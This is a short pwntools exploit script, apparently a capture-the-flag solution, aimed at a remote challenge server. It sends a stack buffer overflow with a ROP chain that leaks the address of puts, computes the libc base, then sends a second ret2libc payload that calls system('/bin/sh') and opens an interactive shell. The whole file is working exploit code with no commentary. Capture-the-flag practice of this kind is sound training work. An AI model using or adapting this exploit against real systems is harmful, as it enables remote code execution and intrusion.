from pwn import *

io = remote("node5.anna.nssctf.cn", 29297)
#io = process("./pwn")
elf = ELF("./pwn")
libc = ELF("./libc6_2.35-0ubuntu1_amd64.so")

puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]

rdi = 0x40117E
ret = 0x40101A
main = 0x4011A8

payload = (
    b"a" * (0x40 + 8) + p64(ret) + p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
)
io.send(payload)
io.recvuntil(b"Go Go Go!!!\n")
puts_addr = u64(io.recv(6).ljust(8, b"\x00"))
print("puts address =", hex(puts_addr))
libc_base = puts_addr - libc.sym["puts"]
print("libc base address =", hex(libc_base))
system_addr = libc_base + libc.sym["system"]
print("system address =", hex(system_addr))
binsh_addr = libc_base + next(libc.search(b"/bin/sh\x00"))
print("/bin/sh address =", hex(binsh_addr))
payload = b"a" * (0x40 + 8)+ p64(rdi) + p64(binsh_addr) + p64(system_addr)
io.send(payload)
io.interactive()
